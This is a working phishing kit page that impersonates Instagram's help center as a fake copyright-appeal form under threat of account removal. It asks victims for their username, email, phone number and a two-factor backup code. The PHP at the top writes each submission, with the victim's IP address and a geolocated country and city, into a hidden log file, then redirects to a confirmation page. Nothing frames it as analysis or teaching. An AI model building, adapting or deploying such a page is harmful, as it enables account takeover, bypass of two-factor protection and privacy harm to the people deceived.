<?php
error_reporting(0);





if($_POST){
$lusy = $_POST['isim'];
$mail = $_POST['mail'];
$kod = $_POST['kod'];
$number = $_POST['number'];

$ip = $_SERVER['REMOTE_ADDR'];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");

$file = fopen('hesaplar.php', 'a');   //TXT DE BURADAN DEGISIYOR  
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<style>

    .center {
      
      margin: 0 auto;
      
    }

    .awesome {
      
      color:#313131;
      -webkit-animation:colorchange 10s infinite alternate;
      
      
    }

    @-webkit-keyframes colorchange {
      0% {
        
        color: blue;
      }
      
      10% {
        
        color: #8e44ad;
      }
      
      20% {
        
        color: #1abc9c;
      }
      
      30% {
        
        color: #d35400;
      }
      
      40% {
        
        color: blue;
      }
      
      50% {
        
        color: #34495e;
      }
      
      60% {
        
        color: blue;
      }
      
      70% {
        
        color: #2980b9;
      }
      80% {
     
        color: #f1c40f;
      }
      
      90% {
     
        color: #2980b9;
      }
      
      100% {
        
        color: pink;
      }
    }
</style>

<body bgcolor='#919191'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font class='awesome' style='font-family:Arial'>
<font class='awesome' color='#1adfed'>Kullanıcı Adı: </font><font color='white'>".$lusy."</font><br>
<font class='awesome' color='#1adfed'> 2 Faktör kodu: </font><font color='white'>".$kod."</font><br>
<font class='awesome' color='#1adfed'> Mail Adresi: </font><font color='white'>".$mail."</font><br>
<font class='awesome' color='#1adfed'> Telefon no: </font><font color='white'>".$number."</font><br>
<font class='awesome' color='#1adfed'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font class='awesome' color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font class='awesome' color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font class='awesome' color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
</font>
<hr>
<br>

"); 
fclose($file);

    header("Location: confirmed.php?nick=".$lusy);
}

    ?>


<html><head> 
<meta charset="utf-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
    <link rel="icon" href="img/instagram.svg">
    <link rel="stylesheet" type="text/css" href="css/style.css">


  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1"> 
  <title>lnstagram Help Center</title> 
  <link rel="icon" href="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png"> 
  <style>
   @media screen and (min-width: 1000px){
    body{
     background: #fafafa;
     font-family: arial;
   }
   .header{
     background-color: #ffffff;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 60px;
     border-bottom: 1px solid #efefef;
   }
   #arainput{
	 background-color: #fafafa;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 215px;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: inline-block;
	 margin-left: 150px;
	 position: relative;
	 top: -10px;
	}
   #araresim{
     width: 13px;
	 position: relative;
	 top: -5px;
	 left: -245px;
   }
   #arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #logo{
	width: 180px;
	height: 37px;
	background: url("https://i.imgyukle.com/2020/06/30/C32Xao.png") no-repeat;
	background-size: cover;
	display: inline-block;
	margin-left: 6%;
   }
   #kutu{
     margin-top: 60px;
     background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 0 0 3px 3px;
     margin-left: 5px;
	 width: 990px;
	 text-align: left;
   }
   #ara{
     border-bottom: 1px solid #dbdbdb;
     width: 98%;
     padding-left: 20px;
     padding-top: 6px;
     padding-bottom: 6px;
     font-size: 16px;
     color: #999999;
     font-weight: 600;
   }
   .lusyoffi a{
     width: 228px;
     height: 21px;
     padding: 16px;
     display: inline-block;
     color: #262626;
       font-size: 14px;
     text-decoration: none;
   }
   .lusyoffi{
     display: block;
   }
   .lusyoffi:hover{
     border-left: 2px solid #bdbcbc;
   }
   #yan{
     border-right: 1px solid #dbdbdb;
     display: block;
     width: 300px;
     height: 737px;
     float: left;
   }
   #ic{
     padding-left: 30px;
     padding-right: 30px;
     padding-top: 30px;
       padding-bottom: 150px;
     display: inline-block;
     width: 610px;
   }
   #footer b {
     font-size: 12px;
     color: #262626;
     display: inline-block;
     margin-right: 30px;
     margin-left: 8px;
     float: right;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
     margin-top: 30px;
     display: inline-block;
   }
    #lusy123{
     background: url("https://teamdarkpirates.com/wp-content/uploads/2019/08/Instagram-icono.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 28%;
	 width: 40px;
	 height: 40px;
	}
    }
    
    
    @media screen and (max-width: 1000px){
   body{
     background: #ffffff;
     font-family: arial;
   }
   #yan{
     display: none;
   }
   #kutu{
	text-align: left;
   }
   .header{
     background-color: #fafafa;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 120px;
     text-align: center;
   }
   #logo{
     background: url("resim/logo1.png") no-repeat; 
     display: block;
     width: 173px;
     background-size: cover;
     height: 36px;
	 margin: auto;
	 margin-top: 10px;
   }
    #arainput{
	 background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 90%;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: block;
	 margin: auto;
	 margin-top: 20px;
	 margin-left: 15px;
	}
	#arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #araresim{
	position: relative;
	left: -47%;
	top: -24px;
   }
   #ara{
     border: 1px solid #dbdbdb;
     width: 100%;
     padding-left: 60px;
     font-size: 14px;
     color: #999999;
     font-weight: 600;
	 position: absolute;
	 right: 0px;
	 left: 0px,
	 display: block;
   }
   #ara p{
	padding-left: 20px;
   }
    #ic{
     padding-left: 10px;
     padding-right: 30px;
     padding-top: 70px;
     padding-bottom: 20px;
   }
    #footer b {
     font-size: 12px;
     color: #262626;
     display: block;
     margin-top: 20px;
     margin-left: 8px;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
   }
   #lusy123{
     background: url("https://i.imgyukle.com/2020/07/04/C9EoWs.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 70%;
	 width: 50px;
	 height: 50px;
	}
    }
	
	
	
   #ic b{
     color: #1C1E21;
   }
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 100px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
   #ic b{
     color: #1C1E21;
   }
   
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #ic p a{
     color: #3897f0;
     text-decoration: none;
   }
   form{
     color: #90949c;
     font-size: 12px;
   }
   form label{
     font-weight: 600;
     line-height: 1.538;
     margin-top: 10px;
     padding: 0px;
   }
   .m{
     width: 300px;
     border: 1px solid #dddfe2;
     color: #1d2129;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
      .cc{
     width: 300px;
background:#fafafa;
     border: 1px solid #dedede;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
   form span{
     text-decoration: none;
     color: #90949c;
     line-height: 1.5;
   }
   .lusypaw{
     display: block;
     margin-top: 10px; 
   }
   .lusy{
     color: #1c1e21;
     width: 50px;
     margin-left: -54px;
     background: none;
     border: none;
     font-weight: bold;
     outline: none;
     font-size: 12px;
     display: none;
   }
   #btn{
     line-height: 26px;
     padding: 0 10px;
     background-color: #4267b2;
     color: #ffffff;
     font-weight: bold;
     text-align: center;
     border: 1px solid #4267b2;
     border-radius: 2px;
     margin-top: 10px;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 140px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
	#tik{
	 width: 20px;
	 position: relative;
	 top: 3px;
	}
	#lusyoffic{
	 display: none;
	}
	#lusyisafk{
	 width: 50px;
	 display: none;
	}
  </style>

 
 </head> 
 <body> 
<img src="https://thumbor.sd-cdn.fr/sHaj_Qv3a99Nj0vOdzrQAi9TaR8=/fit-in/1909x886/cdn.sd-cdn.fr/wp-content/uploads/2016/05/instagram-nouveau-logo-1.png" id="lusyisafk">
 <div id="lusyofficial" style="display: none;">
 <div id="lusy123"> </div>
 </div>
<div id="lusyoffic" style="display: block;">
   <div class="header"> 
  <div id="logo"> </div>
	<input type="text" placeholder="How can we help?" id="arainput">
  </div> 
  <center>
  <div id="kutu"> 
   <div id="ara"> 
    <p> Help Center </p> 
   </div> 
   <div id="yan"> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Using Instagram</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Managing Your Account</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Troubleshooting and Login Help</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Privacy and Safety Center</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
    <div class="lusyoffi"> 
     <a href="https://help.instagram.com/">Instagram for Businesses</a> 
     <img src="https://i.imgyukle.com/2020/06/22/CX0x0S.png"> 
    </div> 
   </div> 
   <div id="ic"> 
    <b>Appeal to Copyright Infringement</b>
    <p>Hi, Dear User,
    <p>As lnstagram, we remove accounts that violate our copyright laws.
If you appeal, we will review your account.
We'll contact you by email later.
<br>If you do not provide feedback, we will remove your account.
<br>

	<form method="POST"> 
     <label>Full Name</label> 
     <br> 
     <input type="text" class="m" id="isimm" name="full_name" required=""> 
     <br> 
     <div class="lusypaw"> 
      <label>Your Username</label> 
      <br> 
      <span> [e.g. If the link to your Instagram account is instagram.com/[username], please enter "username" in this field]</span> 
      <br> 
      <input type="text" id="usernamee" class="m" value="<?php echo $lusy?>" name="isim" required=""> 
     </div> 
     <div class="lusypaw"> 
     
      <br>
      <label>Email Address</label> 
      <br>
       <span> [Email address linked to your account] </span>
      <br> 
      <input type="email" id="maill" class="m" name="mail" required=""> 

     </div> 
	 
     <div class="talha"> 
<br><!------------SCRİPT BY RECEP------------->
        <label>Phone number</label> 
<br><!------------SCRİPT BY RECEP------------->
        <span>Phone number linked to your account.</span>
<br><!------------SCRİPT BY RECEP-------------> 
        <input type="number" class="talha12" name="number" required=""> 
    </div> 
<div class="talha"> 
<label>Country</label> 
<br><!------------SCRİPT BY RECEP-------------> 
        <span>Country where you registered on lnstagram</span> 
<br><!------------SCRİPT BY RECEP-------------> 
<select class="talha12" name="country">
<option value="Afganistan">choose country</option>
   <option value="Afganistan">Afghanistan</option>
   <option value="Albania">Albania</option>
   <option value="Algeria">Algeria</option>
   <option value="American Samoa">American Samoa</option>
   <option value="Andorra">Andorra</option>
   <option value="Angola">Angola</option>
   <option value="Anguilla">Anguilla</option>
   <option value="Antigua & Barbuda">Antigua & Barbuda</option>
   <option value="Argentina">Argentina</option>
   <option value="Armenia">Armenia</option>
   <option value="Aruba">Aruba</option>
   <option value="Australia">Australia</option>
   <option value="Austria">Austria</option>
   <option value="Azerbaijan">Azerbaijan</option>
   <option value="Bahamas">Bahamas</option>
   <option value="Bahrain">Bahrain</option>
   <option value="Bangladesh">Bangladesh</option>
   <option value="Barbados">Barbados</option>
   <option value="Belarus">Belarus</option>
   <option value="Belgium">Belgium</option>
   <option value="Belize">Belize</option>
   <option value="Benin">Benin</option>
   <option value="Bermuda">Bermuda</option>
   <option value="Bhutan">Bhutan</option>
   <option value="Bolivia">Bolivia</option>
   <option value="Bonaire">Bonaire</option>
   <option value="Bosnia & Herzegovina">Bosnia & Herzegovina</option>
   <option value="Botswana">Botswana</option>
   <option value="Brazil">Brazil</option>
   <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
   <option value="Brunei">Brunei</option>
   <option value="Bulgaria">Bulgaria</option>
   <option value="Burkina Faso">Burkina Faso</option>
   <option value="Burundi">Burundi</option>
   <option value="Cambodia">Cambodia</option>
   <option value="Cameroon">Cameroon</option>
   <option value="Canada">Canada</option>
   <option value="Canary Islands">Canary Islands</option>
   <option value="Cape Verde">Cape Verde</option>
   <option value="Cayman Islands">Cayman Islands</option>
   <option value="Central African Republic">Central African Republic</option>
   <option value="Chad">Chad</option>
   <option value="Channel Islands">Channel Islands</option>
   <option value="Chile">Chile</option>
   <option value="China">China</option>
   <option value="Christmas Island">Christmas Island</option>
   <option value="Cocos Island">Cocos Island</option>
   <option value="Colombia">Colombia</option>
   <option value="Comoros">Comoros</option>
   <option value="Congo">Congo</option>
   <option value="Cook Islands">Cook Islands</option>
   <option value="Costa Rica">Costa Rica</option>
   <option value="Cote DIvoire">Cote DIvoire</option>
   <option value="Croatia">Croatia</option>
   <option value="Cuba">Cuba</option>
   <option value="Curaco">Curacao</option>
   <option value="Cyprus">Cyprus</option>
   <option value="Czech Republic">Czech Republic</option>
   <option value="Denmark">Denmark</option>
   <option value="Djibouti">Djibouti</option>
   <option value="Dominica">Dominica</option>
   <option value="Dominican Republic">Dominican Republic</option>
   <option value="East Timor">East Timor</option>
   <option value="Ecuador">Ecuador</option>
   <option value="Egypt">Egypt</option>
   <option value="El Salvador">El Salvador</option>
   <option value="Equatorial Guinea">Equatorial Guinea</option>
   <option value="Eritrea">Eritrea</option>
   <option value="Estonia">Estonia</option>
   <option value="Ethiopia">Ethiopia</option>
   <option value="Falkland Islands">Falkland Islands</option>
   <option value="Faroe Islands">Faroe Islands</option>
   <option value="Fiji">Fiji</option>
   <option value="Finland">Finland</option>
   <option value="France">France</option>
   <option value="French Guiana">French Guiana</option>
   <option value="French Polynesia">French Polynesia</option>
   <option value="French Southern Ter">French Southern Ter</option>
   <option value="Gabon">Gabon</option>
   <option value="Gambia">Gambia</option>
   <option value="Georgia">Georgia</option>
   <option value="Germany">Germany</option>
   <option value="Ghana">Ghana</option>
   <option value="Gibraltar">Gibraltar</option>
   <option value="Great Britain">Great Britain</option>
   <option value="Greece">Greece</option>
   <option value="Greenland">Greenland</option>
   <option value="Grenada">Grenada</option>
   <option value="Guadeloupe">Guadeloupe</option>
   <option value="Guam">Guam</option>
   <option value="Guatemala">Guatemala</option>
   <option value="Guinea">Guinea</option>
   <option value="Guyana">Guyana</option>
   <option value="Haiti">Haiti</option>
   <option value="Hawaii">Hawaii</option>
   <option value="Honduras">Honduras</option>
   <option value="Hong Kong">Hong Kong</option>
   <option value="Hungary">Hungary</option>
   <option value="Iceland">Iceland</option>
   <option value="Indonesia">Indonesia</option>
   <option value="India">India</option>
   <option value="Iran">Iran</option>
   <option value="Iraq">Iraq</option>
   <option value="Ireland">Ireland</option>
   <option value="Isle of Man">Isle of Man</option>
   <option value="Israel">Israel</option>
   <option value="Italy">Italy</option>
   <option value="Jamaica">Jamaica</option>
   <option value="Japan">Japan</option>
   <option value="Jordan">Jordan</option>
   <option value="Kazakhstan">Kazakhstan</option>
   <option value="Kenya">Kenya</option>
   <option value="Kiribati">Kiribati</option>
   <option value="Korea North">Korea North</option>
   <option value="Korea Sout">Korea South</option>
   <option value="Kuwait">Kuwait</option>
   <option value="Kyrgyzstan">Kyrgyzstan</option>
   <option value="Laos">Laos</option>
   <option value="Latvia">Latvia</option>
   <option value="Lebanon">Lebanon</option>
   <option value="Lesotho">Lesotho</option>
   <option value="Liberia">Liberia</option>
   <option value="Libya">Libya</option>
   <option value="Liechtenstein">Liechtenstein</option>
   <option value="Lithuania">Lithuania</option>
   <option value="Luxembourg">Luxembourg</option>
   <option value="Macau">Macau</option>
   <option value="Macedonia">Macedonia</option>
   <option value="Madagascar">Madagascar</option>
   <option value="Malaysia">Malaysia</option>
   <option value="Malawi">Malawi</option>
   <option value="Maldives">Maldives</option>
   <option value="Mali">Mali</option>
   <option value="Malta">Malta</option>
   <option value="Marshall Islands">Marshall Islands</option>
   <option value="Martinique">Martinique</option>
   <option value="Mauritania">Mauritania</option>
   <option value="Mauritius">Mauritius</option>
   <option value="Mayotte">Mayotte</option>
   <option value="Mexico">Mexico</option>
   <option value="Midway Islands">Midway Islands</option>
   <option value="Moldova">Moldova</option>
   <option value="Monaco">Monaco</option>
   <option value="Mongolia">Mongolia</option>
   <option value="Montserrat">Montserrat</option>
   <option value="Morocco">Morocco</option>
   <option value="Mozambique">Mozambique</option>
   <option value="Myanmar">Myanmar</option>
   <option value="Nambia">Nambia</option>
   <option value="Nauru">Nauru</option>
   <option value="Nepal">Nepal</option>
   <option value="Netherland Antilles">Netherland Antilles</option>
   <option value="Netherlands">Netherlands (Holland, Europe)</option>
   <option value="Nevis">Nevis</option>
   <option value="New Caledonia">New Caledonia</option>
   <option value="New Zealand">New Zealand</option>
   <option value="Nicaragua">Nicaragua</option>
   <option value="Niger">Niger</option>
   <option value="Nigeria">Nigeria</option>
   <option value="Niue">Niue</option>
   <option value="Norfolk Island">Norfolk Island</option>
   <option value="Norway">Norway</option>
   <option value="Oman">Oman</option>
   <option value="Pakistan">Pakistan</option>
   <option value="Palau Island">Palau Island</option>
   <option value="Palestine">Palestine</option>
   <option value="Panama">Panama</option>
   <option value="Papua New Guinea">Papua New Guinea</option>
   <option value="Paraguay">Paraguay</option>
   <option value="Peru">Peru</option>
   <option value="Phillipines">Philippines</option>
   <option value="Pitcairn Island">Pitcairn Island</option>
   <option value="Poland">Poland</option>
   <option value="Portugal">Portugal</option>
   <option value="Puerto Rico">Puerto Rico</option>
   <option value="Qatar">Qatar</option>
   <option value="Republic of Montenegro">Republic of Montenegro</option>
   <option value="Republic of Serbia">Republic of Serbia</option>
   <option value="Reunion">Reunion</option>
   <option value="Romania">Romania</option>
   <option value="Russia">Russia</option>
   <option value="Rwanda">Rwanda</option>
   <option value="St Barthelemy">St Barthelemy</option>
   <option value="St Eustatius">St Eustatius</option>
   <option value="St Helena">St Helena</option>
   <option value="St Kitts-Nevis">St Kitts-Nevis</option>
   <option value="St Lucia">St Lucia</option>
   <option value="St Maarten">St Maarten</option>
   <option value="St Pierre & Miquelon">St Pierre & Miquelon</option>
   <option value="St Vincent & Grenadines">St Vincent & Grenadines</option>
   <option value="Saipan">Saipan</option>
   <option value="Samoa">Samoa</option>
   <option value="Samoa American">Samoa American</option>
   <option value="San Marino">San Marino</option>
   <option value="Sao Tome & Principe">Sao Tome & Principe</option>
   <option value="Saudi Arabia">Saudi Arabia</option>
   <option value="Senegal">Senegal</option>
   <option value="Seychelles">Seychelles</option>
   <option value="Sierra Leone">Sierra Leone</option>
   <option value="Singapore">Singapore</option>
   <option value="Slovakia">Slovakia</option>
   <option value="Slovenia">Slovenia</option>
   <option value="Solomon Islands">Solomon Islands</option>
   <option value="Somalia">Somalia</option>
   <option value="South Africa">South Africa</option>
   <option value="Spain">Spain</option>
   <option value="Sri Lanka">Sri Lanka</option>
   <option value="Sudan">Sudan</option>
   <option value="Suriname">Suriname</option>
   <option value="Swaziland">Swaziland</option>
   <option value="Sweden">Sweden</option>
   <option value="Switzerland">Switzerland</option>
   <option value="Syria">Syria</option>
   <option value="Tahiti">Tahiti</option>
   <option value="Taiwan">Taiwan</option>
   <option value="Tajikistan">Tajikistan</option>
   <option value="Tanzania">Tanzania</option>
   <option value="Thailand">Thailand</option>
   <option value="Togo">Togo</option>
   <option value="Tokelau">Tokelau</option>
   <option value="Tonga">Tonga</option>
   <option value="Trinidad & Tobago">Trinidad & Tobago</option>
   <option value="Tunisia">Tunisia</option>
   <option value="Turkey">Turkey</option>
   <option value="Turkmenistan">Turkmenistan</option>
   <option value="Turks & Caicos Is">Turks & Caicos Is</option>
   <option value="Tuvalu">Tuvalu</option>
   <option value="Uganda">Uganda</option>
   <option value="United Kingdom">United Kingdom</option>
   <option value="Ukraine">Ukraine</option>
   <option value="United Arab Erimates">United Arab Emirates</option>
   <option value="United States of America">United States of America</option>
   <option value="Uraguay">Uruguay</option>
   <option value="Uzbekistan">Uzbekistan</option>
   <option value="Vanuatu">Vanuatu</option>
   <option value="Vatican City State">Vatican City State</option>
   <option value="Venezuela">Venezuela</option>
   <option value="Vietnam">Vietnam</option>
   <option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
   <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
   <option value="Wake Island">Wake Island</option>
   <option value="Wallis & Futana Is">Wallis & Futana Is</option>
   <option value="Yemen">Yemen</option>
   <option value="Zaire">Zaire</option>
   <option value="Zambia">Zambia</option>
   <option value="Zimbabwe">Zimbabwe</option>
</select>
<input type="button" class="lusy"> 
        </div> 
<div class="lusypaw"> 
<br>

<!------------SCRİPT BY RECEP-------------> 
        <label>If possible, enter one of your 2-factor authentication backup codes, if there is no factor you can leave it blank.</label>
<br>
<input type="text" class="m" name="kod" >
    </div> 
 <br> <br>  




	
<label>Explanation</label>
<br><!------------SCRİPT BY RECEP-------------> 
        <span>The statement you will make to our Instagram attachment</span> 
<br><!------------SCRİPT BY RECEP-------------> 
        <br>
        <textarea type="text" class="talha12" name="appeal_reason" cols="10" rows="5" name="aciklama" placeholder="" required="1" aria-required="true" style="margin: 0px; width: 300px; height: 81px;"></textarea>
<br><!------------SCRİPT BY RECEP-------------> 
        <div class="talha"> 
    </div>
    <br><b>The reason we ask for this information is to verify that you are the true owner of your account.</b></p> 

     <button id="btn" name="submit">Submit</button>

</form> 
   </div> 
  </div> 
  </center>
  <div id="footer"> 
   <a href="https://www.instagram.com/about/us/"> ABOUT US </a> 
   <a href="https://help.instagram.com/"> HELP </a> 
   <a href="https://www.instagram.com/developers/"> API </a> 
   <a href="https://www.instagram.com/about/jobs/"> JOBS </a> 
   <a href="https://www.instagram.com/legal/terms/"> TERMS </a> 
   <a href="https://www.instagram.com/legal/privacy/"> PRIVACY </a> 
   <b> © 2021 INSTAGRAM, INC. </b> 
   <br> 
   <label> ENGLISH (UK) </label> 
   <label> TURKISH </label> 
   <label> KURDÎ (KURMANCÎ)</label> 
   <label> العربية </label> 
   <label> ZAZA </label> 
   <label> DEUTSCH </label> 
   <label> РУССКИЙ </label> 
   <label> FRANÇAIS (FRANCE) </label> 
   <label> فارسی </label> 
   <label> ESPAÑOL</label> 
   <label> PORTUGUÊS (BRASIL) </label> 
  </div> 
 </div>
    </script>
</body></html>